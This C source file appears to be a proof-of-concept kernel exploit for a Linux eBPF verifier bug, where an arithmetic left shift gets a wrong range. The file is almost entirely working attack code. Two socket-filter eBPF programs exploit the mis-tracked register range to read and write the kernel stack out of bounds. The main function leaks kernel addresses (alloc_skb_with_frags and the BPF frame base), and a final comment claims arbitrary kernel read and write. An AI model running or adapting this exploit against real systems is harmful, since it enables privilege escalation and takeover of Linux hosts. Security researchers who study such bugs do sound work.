
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/socket.h>

#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))


#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)  \
  ((struct bpf_insn){                           \
    .code = CODE,                               \
      .dst_reg = DST,                           \
      .src_reg = SRC,                           \
      .off = OFF,                               \
      .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
      .dst_reg = DST,                           \
      .src_reg = SRC,                           \
      .off   = 0,                               \
      .imm   = (__u32) (IMM) }),                \
    ((struct bpf_insn) {                        \
      .code  = 0,                               \
        .dst_reg = 0,                           \
        .src_reg = 0,                           \
        .off   = 0,                             \
        .imm   = ((__u64) (IMM)) >> 32 })

#define BPF_ALSH 0xe0
#define BPF_ALSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_ALSH | BPF_X, DST, SRC, 0, 0)
#define BPF_ALSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_ALSH | BPF_K, DST, 0, 0, IMM)
#define BPF_ALSH64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_ALSH | BPF_X, DST, SRC, 0, 0)
#define BPF_ALSH64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_ALSH | BPF_K, DST, 0, 0, IMM)

/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_FUNC_trace_printk 6

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU_IMM(OP, DST, IMM)               \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU_REG(OP, DST, SRC)               \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })

int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

int array_update(int mapfd, uint32_t key, uint64_t value)
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (uint64_t)&key,
		.value = (uint64_t)&value,
		.flags = BPF_ANY,
	};
	return bpf_(BPF_MAP_UPDATE_ELEM, &attr);
}

uint64_t array_get_dw(int mapfd, uint32_t key) {
  uint64_t value = 0;
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };
  int res = bpf_(BPF_MAP_LOOKUP_ELEM, &attr);
  if (res)
    err(1, "map lookup elem");
  return value;
}

int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)GPLv2,
    .log_level = 1,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  printf("==========================\n%s==========================\n", verifier_log);
  errno = errno_;
  if (progfd == -1)
    err(1, "prog load");
  return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);

  // hook eBPF program up to a socket
  // sendmsg() to the socket will trigger the filter
  // returning 0 in the filter should toss the packet
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    err(1, "socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    err(1, "setsockopt");
  return socks[1];
}

void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    err(1, "write to proc socket failed");
}

static int small_map;
static int reader_fd, writer_fd;
uintptr_t stack_read(int64_t offset)
{
  offset += 16;
  offset /= 8;  // assert offset < 0
  array_update(small_map, 0, offset);
  trigger_proc(reader_fd);
  return array_get_dw(small_map, 0);
}

void stack_write(int64_t offset, uint64_t data)
{
  offset += 16;
  offset /= 8;  // assert offset < 0
  array_update(small_map, 0, offset);
  array_update(small_map, 1, data);
  trigger_proc(writer_fd);
}

int main(void) {
  small_map = array_create(0x10, 2);
  struct bpf_insn reader_insns[] = {
    BPF_LD_MAP_FD(BPF_REG_ARG1, small_map), // r1 = map_arr(0x10, 1)
    BPF_MOV64_IMM(BPF_REG_6, 0x80000000),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_6, 32),  // r6 = S64_MIN
    
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),  // r2 = fp - 8
    BPF_ST_MEM(BPF_DW, BPF_REG_ARG2, 0, 0),    // *(r2) = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_ARG2, -8, 0),    // *(r2) = 0 for later access
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),   // r0 = bpf_map_lookup_elem(r1, r2)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // if r0 == 0 exit()
    BPF_EXIT_INSN(),

    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0),  // r3 = r0[0]
    BPF_JMP_IMM(BPF_JSGT, BPF_REG_3, 0, 1),  // if r3 s> 0 jmp1
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_3),  // r6 = r3 in range [S64_MIN, 0] => r6 range [S64_MIN, 0]

    BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 3),  // BUG: r6 invalid range [0, 0], where in fact we have 0, -8, -16, ...
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 8),

    BPF_MOV64_REG(BPF_REG_7, BPF_REG_FP),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_6),  // bpf - (8, 16, 24, ...)

    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_7, -8),  // r7 = [fp - (16, 24, ...)]

    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),  // *r0 = r4

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  reader_fd = create_filtered_socket_fd(reader_insns, ARRSIZE(reader_insns));

  struct bpf_insn writer_insns[] = {
    BPF_LD_MAP_FD(BPF_REG_ARG1, small_map), // r1 = map_arr(0x10, 1)
    
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),  // r2 = fp - 8
    BPF_ST_MEM(BPF_DW, BPF_REG_ARG2, 0, 1),    // *(r2) = 1
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),   // r0 = bpf_map_lookup_elem(r1, r2)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // if r0 == 0 exit()
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),  // r9 = data

    BPF_LD_MAP_FD(BPF_REG_ARG1, small_map), // r1 = map_arr(0x10, 1)
    BPF_MOV64_IMM(BPF_REG_6, 0x80000000),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_6, 32),  // r6 = S64_MIN
    
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),  // r2 = fp - 8
    BPF_ST_MEM(BPF_DW, BPF_REG_ARG2, 0, 0),    // *(r2) = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_ARG2, -8, 0),    // *(r2) = 0 for later access
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),   // r0 = bpf_map_lookup_elem(r1, r2)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // if r0 == 0 exit()
    BPF_EXIT_INSN(),

    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0),  // r3 = r0[0]
    BPF_JMP_IMM(BPF_JSGT, BPF_REG_3, 0, 1),  // if r3 s> 0 jmp1
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_3),  // r6 = r3 in range [S64_MIN, 0] => r6 range [S64_MIN, 0]

    BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 3),  // BUG: r6 invalid range [0, 0], where in fact we have 0, -8, -16, ...
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 8),

    BPF_MOV64_REG(BPF_REG_7, BPF_REG_FP),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_6),  // bpf - (8, 16, 24, ...)

    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_9, -8),  // [fp - (16, 24, ...)] = r9

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  writer_fd = create_filtered_socket_fd(writer_insns, ARRSIZE(writer_insns));

  uintptr_t alloc_skb_with_frags = stack_read(-14 * 8) - (0x89 - 0x40);
  uintptr_t bpf_frame_base = stack_read(-8 * 8) + 0x210;

  printf("%20s: %#016lx\n", "alloc_skb_with_frags", alloc_skb_with_frags);
  printf("%20s: %#016lx\n", "bpf_frame_base", bpf_frame_base);

  // we have kernel base leak + bpf frame leak + bpf frame-relative RW => AAR/W

  getchar();
}
